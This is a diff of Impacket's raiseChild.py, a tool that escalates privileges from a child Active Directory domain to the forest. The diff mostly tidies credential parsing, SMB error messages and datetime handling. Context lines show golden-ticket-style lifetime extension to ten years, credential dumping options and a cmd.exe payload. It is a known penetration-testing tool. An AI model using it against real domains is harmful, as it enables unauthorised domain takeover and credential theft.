@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -90,7 +92,7 @@ from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, 
 from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 from impacket.examples import logger
-from impacket.examples.utils import parse_credentials
+from impacket.examples.utils import parse_identity
 from impacket.ntlm import LMOWFv1, NTOWFv1
 from impacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
@@ -552,9 +554,21 @@ class RAISECHILD:
 
     @staticmethod
     def getMachineName(machineIP):
-        s = SMBConnection(machineIP, machineIP)
         try:
-            s.login('','')
+            s = SMBConnection(machineIP, machineIP)
+            s.login('', '')
+        except OSError as e:
+            if str(e).find('timed out') > 0:
+                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
+                                'corresponding NetBIOS name or FQDN instead of IP address')
+            else:
+                raise
+        except SessionError as e:
+            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
+                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
+                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option.')
+            else:
+                raise
         except Exception:
             logging.debug('Error while anonymous logging into %s' % machineIP)
         else:
@@ -563,9 +577,21 @@ class RAISECHILD:
 
     @staticmethod
     def getDNSMachineName(machineIP):
-        s = SMBConnection(machineIP, machineIP)
         try:
-            s.login('','')
+            s = SMBConnection(machineIP, machineIP)
+            s.login('', '')
+        except OSError as e:
+            if str(e).find('timed out') > 0:
+                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
+                                'corresponding NetBIOS name or FQDN instead of IP address.')
+            else:
+                raise
+        except SessionError as e:
+            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
+                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
+                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option.')
+            else:
+                raise
         except Exception:
             logging.debug('Error while anonymous logging into %s' % machineIP)
         else:
@@ -881,7 +907,7 @@ class RAISECHILD:
         encTicketPart = decoder.decode(plainText, asn1Spec = EncTicketPart())[0]
 
         # Let's extend the ticket's validity a lil bit
-        tenYearsFromNow = datetime.datetime.utcnow() + datetime.timedelta(days=365*10)
+        tenYearsFromNow = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365*10)
         encTicketPart['endtime'] = KerberosTime.to_asn1(tenYearsFromNow)
         encTicketPart['renew-till'] = KerberosTime.to_asn1(tenYearsFromNow)
         #print encTicketPart.prettyPrint()
@@ -1222,7 +1248,6 @@ class RAISECHILD:
                 executer.run(self.__target)
 
 if __name__ == '__main__':
-
     print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Privilege Escalation from a child domain up to its "
@@ -1240,7 +1265,6 @@ if __name__ == '__main__':
                         'dump credentials. Administrator (500) by default.')
 
     group = parser.add_argument_group('authentication')
-
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
@@ -1269,27 +1293,13 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts)
+    logger.init(options.ts, options.debug)
 
-    domain, username, password = parse_credentials(options.target)
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
+    domain, username, password, _, _, options.k = parse_identity(options.target, options.hashes, options.no_pass, options.aesKey, options.k)
 
     if domain == '':
         logging.critical('Domain should be specified!')
         sys.exit(1)
-
-    if password == '' and username != '' and options.hashes is None and options.aesKey is None:
-        from getpass import getpass
-        password = getpass("Password:")
-
-    if options.aesKey is not None:
-        options.k = True
 
     commands = 'cmd.exe'
 
@@ -1305,4 +1315,4 @@ if __name__ == '__main__':
         logging.critical(str(e))
         if hasattr(e, 'error_code'):
             if e.error_code == 0xc0000073:
-                logging.info("Account not found in domain. (RID:%s)", options.targetRID)
+                logging.info("Account not found in domain. (RID:%s)" % options.targetRID)
